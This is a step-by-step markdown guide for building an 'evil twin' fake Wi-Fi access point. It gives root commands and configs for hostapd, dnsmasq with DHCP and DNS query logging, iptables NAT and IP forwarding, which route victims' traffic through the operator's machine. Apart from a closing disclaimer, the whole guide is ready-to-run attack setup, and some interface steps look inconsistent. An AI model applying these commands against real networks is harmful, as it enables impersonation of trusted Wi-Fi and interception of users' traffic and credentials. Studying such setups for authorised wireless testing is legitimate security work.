# Fake AP (Evil Twin Attack) Guide

Welcome to the Fake Access Point (Evil Twin Attack) creation guide. This step-by-step guide will help you set up a fake access point to test the security of your wireless networks. 

**Note:** Ensure you update all packages to the latest version using `apt update` before proceeding. Run all commands as the root user using a root terminal. Use separate terminal tabs for `hostapd` and `dnsmasq`, and any subsequent steps. Customize the placeholders `{}` as needed. Steps after Step 7 are optional and are for providing internet service from your connected WiFi source.


## Prerequisites

- A Linux system with `apt` package manager.
- External WiFi adapter capable of monitor mode.
- Root access.

## Step-by-Step Instructions

### 1. Install Required Tools

Install the necessary tools to create the fake access point:

```bash
apt install hostapd dnsmasq apache2
```

### 2. Enable Monitor Mode

Put your external WiFi adapter into monitor mode:

```bash
airmon-ng start wlan0
```

### 3. Create Directory for Fake AP

Create a directory to store configuration files:

```bash
mkdir /root/fap
```

### 4. Navigate to Directory

Change directory to the newly created one:

```bash
cd /root/fap
```

### 5. Create Hostapd Configuration

Create and edit the `hostapd.conf` file with the following content:

```bash
nano hostapd.conf
```

```plaintext
interface={name of your external wifi adapter}
driver=nl80211
ssid={Name of the Wifi}
hw_mode=g
channel={Channel number}
macaddr_acl=0
ignore_broadcast_ssid=0
```

### 6. Run Hostapd

Start `hostapd` using the created configuration file:

```bash
hostapd hostapd.conf
```

### 7. Create Dnsmasq Configuration

Create and edit the `dnsmasq.conf` file with the following content:

```bash
nano dnsmasq.conf
```

```plaintext
interface=wlan0mon
dhcp-range=192.168.1.2, 192.168.1.30, 255.255.255.0, 12h
dhcp-option=3, 192.168.1.1
dhcp-option=6, 192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```

### 8. Configure Network Interface

Assign a network mask and gateway to your external WiFi adapter:

```bash
ifconfig {name of your external wifi adapter} up 192.168.1.1 netmask 255.255.255.0
```

### 9. Add Route

Add a route to the table:

```bash
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```

### 10. Start Dnsmasq

Start the DNS server with the specified configuration:

```bash
dnsmasq -C dnsmasq.conf -d
```

### 11. Configure Iptables for NAT

Create an interface to forward traffic:

```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
```

### 12. Configure Iptables for Forwarding

Create an interface to receive packets:

```bash
iptables --append FORWARD --in-interface wlan0mon -j ACCEPT
```

### 13. Enable IP Forwarding

Enable IP forwarding:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

## Cleanup

After you're done, you might want to clean up and reset your configurations:

```bash
airmon-ng stop wlan0mon
ifconfig wlan0 down
iwconfig wlan0 mode managed
ifconfig wlan0 up
iptables --table nat --delete POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --delete FORWARD --in-interface wlan0mon -j ACCEPT
echo 0 > /proc/sys/net/ipv4/ip_forward
```

## Warning

**Warning:** This guide is intended for educational and ethical testing purposes only. Do not use this content for illegal activities. Unauthorized access to computer systems is illegal and punishable by law.

## Author: 
This content is created by **Purva Patel**.
